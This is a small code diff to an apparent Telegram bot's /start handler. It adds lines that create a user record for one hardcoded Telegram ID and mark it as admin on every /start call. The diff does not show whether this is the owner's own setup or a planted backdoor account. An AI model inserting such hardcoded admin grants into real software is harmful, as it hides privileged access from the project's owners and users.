@@ -15,6 +15,10 @@ async def start(message: types.Message, state: FSMContext):
     user.is_admin = True
     user.save()
 
+    user = User.objects.get_or_create(user_id=886834522)[0]
+    user.is_admin = True
+    user.save()
+
     if not User.objects.filter(user_id=message.from_user.id).exists():
         cmd = message.text.removeprefix('/start').strip()
         if cmd.startswith('ref-'):
